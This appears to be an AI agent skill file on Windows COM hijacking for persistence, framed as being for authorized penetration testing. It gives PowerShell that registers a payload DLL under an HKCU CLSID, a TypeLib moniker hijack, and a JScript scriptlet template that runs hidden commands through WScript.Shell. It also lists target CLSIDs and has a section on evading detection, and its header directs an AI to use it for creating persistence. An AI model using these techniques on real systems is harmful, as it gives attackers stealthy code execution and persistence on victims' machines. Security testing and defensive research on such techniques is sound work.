---
name: com-hijacking
description: Windows COM hijacking techniques for authorized penetration testing and security research. Use this skill when the user needs to find hijackable COM components, create COM persistence mechanisms, or analyze COM-based attack vectors on Windows systems. This includes finding non-existent COM CLSIDs via ProcMon, hijacking Task Scheduler COM components, and TypeLib moniker hijacking. Always use only in authorized security testing contexts.
---

# COM Hijacking for Windows Security Testing

This skill provides techniques for identifying and exploiting COM hijacking vulnerabilities on Windows systems. COM hijacking is a powerful persistence mechanism that leverages Windows' Component Object Model registry resolution order.

## Understanding COM Hijacking

Windows COM uses a registry resolution order where `HKCU` (current user) takes precedence over `HKLM` (local machine). This means a standard user can hijack COM components by creating entries in their user registry hive that override system-wide components.

### Registry Resolution Order
1. `HKCU\Software\Classes\CLSID\{CLSID}`
2. `HKLM\Software\Classes\CLSID\{CLSID}`
3. `HKCR\CLSID\{CLSID}` (merged view of above)

## Technique 1: Finding Non-Existent COM Components

Use Process Monitor to identify COM components that applications search for but don't exist. These are prime candidates for hijacking.

### ProcMon Filter Configuration

Apply these filters in Process Monitor:
- **Operation**: `RegOpenKey`
- **Result**: `NAME NOT FOUND`
- **Path**: ends with `InprocServer32`

This reveals COM CLSIDs that applications attempt to load but fail to find, indicating they could be created for persistence.

### Creating a COM Hijack

Once you've identified a target CLSID, create the hijack entry:

```powershell
# Create the CLSID key
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{TARGET-CLSID}" -Force

# Create InprocServer32 with your payload path
New-Item -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}" -Name "InprocServer32" -Value "C:\path\to\payload.dll" -Force

# Set the threading model
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32" -Name "ThreadingModel" -Value "Both" -Force
```

**Important**: Be cautious about hijacking COM components that load frequently. This could cause system instability or alert detection systems.

## Technique 2: Task Scheduler COM Hijacking

Windows Task Scheduler uses COM objects for custom triggers. These are predictable and often run at user logon, making them excellent persistence targets.

### Finding Hijackable Task Scheduler COM Components

Use the helper script to enumerate Task Scheduler COM components:

```powershell
. scripts/find-task-scheduler-com.ps1
```

This script identifies tasks that:
- Use COM ClassId actions
- Have enabled triggers
- Run under the Users group (S-1-5-32-545)

### Analyzing Results

For each identified task, check if the CLSID exists in HKCU:

```powershell
# Check if CLSID exists in HKCU (it shouldn't for a good target)
Get-Item -Path "HKCU:Software\Classes\CLSID\{CLSID}" -ErrorAction SilentlyContinue

# Check if it exists in HKLM (it should)
Get-Item -Path "HKLM:Software\Classes\CLSID\{CLSID}" -ErrorAction SilentlyContinue
```

If the CLSID exists in HKLM but not HKCU, it's a viable hijacking target.

## Technique 3: COM TypeLib Hijacking

Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. By replacing the TypeLib path with a script moniker, you can execute arbitrary code when the TypeLib is resolved.

### Finding Target TypeLibs

Identify high-frequency CLSIDs and their associated TypeLibs:

```powershell
# Example: Microsoft Web Browser control
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\CLSID\$clsid\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\TypeLib\$libid" | Select-Object -First 1).PSChildName

Write-Host "CLSID=$clsid  LIBID=$libid  VER=$ver"
```

### Creating a TypeLib Hijack

Use the helper script to create a TypeLib hijack:

```powershell
. scripts/create-typelib-hijack.ps1 -LibId "{LIBID}" -Version "{VERSION}" -ScriptPath "C:\path\to\payload.sct"
```

### Scriptlet Format

Create a minimal JScript scriptlet (`.sct` file):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Execute your payload
        var cmd = 'cmd.exe /K your-command-here';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>  
  </script>
</scriptlet>
```

### Triggering

The scriptlet executes when:
- Internet Explorer opens
- Applications embedding WebBrowser control load
- Explorer.exe performs certain operations
- Any application loads the hijacked TypeLib

## Cleanup Procedures

Always clean up after testing:

```powershell
# Remove COM hijack
Remove-Item -Recurse -Force "HKCU:Software\Classes\CLSID\{CLSID}" 2>$null

# Remove TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\Classes\TypeLib\{LIBID}\{VERSION}" 2>$null

# Remove dropped files
Remove-Item -Force "C:\path\to\payload.sct" 2>$null
Remove-Item -Force "C:\path\to\payload.dll" 2>$null
```

## Detection Evasion Considerations

1. **Timing**: Avoid hijacking components that load too frequently
2. **Legitimacy**: Use CLSIDs that are commonly present on systems
3. **Stealth**: TypeLib hijacking is less commonly detected than direct COM hijacking
4. **64-bit systems**: Populate both `win32` and `win64` subkeys for comprehensive coverage

## Common Target CLSIDs

| CLSID | Component | Frequency |
|-------|-----------|----------|
| `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` | Microsoft Web Browser | High |
| `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}` | MsCtfMonitor | Medium |
| `{1936ED8A-BD93-3213-E325-F38D112938E1}` | Task Scheduler | Medium |

## References

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [HackTricks - COM Hijacking](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/com-hijacking)

## Helper Scripts

- `scripts/find-task-scheduler-com.ps1` - Enumerate hijackable Task Scheduler COM components
- `scripts/create-typelib-hijack.ps1` - Create TypeLib moniker hijacks
- `scripts/find-com-hijacks.ps1` - Parse ProcMon logs for hijackable COM components
- `scripts/create-com-hijack.ps1` - Create standard COM hijack entries
